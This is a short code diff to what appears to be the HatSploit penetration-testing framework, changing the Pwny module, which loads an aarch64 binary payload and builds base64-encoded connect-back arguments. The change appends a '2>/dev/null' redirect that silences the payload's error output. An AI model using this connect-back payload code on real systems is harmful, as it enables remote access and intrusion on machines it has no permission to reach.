@@ -33,6 +33,8 @@ from hatsploit.utils.string import StringTools
 class Pwny(StringTools):
     config = Config()
 
+    stderr_plug = "2>/dev/null"
+
     def get_payload(self):
         return open(
             self.config.path_config['data_path'] + 'pwny/pwny.aarch64', 'rb'
@@ -44,4 +46,7 @@ class Pwny(StringTools):
             'port': connback_port
         })
 
-        return self.base64_string(connback_data)
+        encoded_data = self.base64_string(connback_data)
+        encoded_args = f"{encoded_data} {self.stderr_plug}"
+
+        return encoded_args
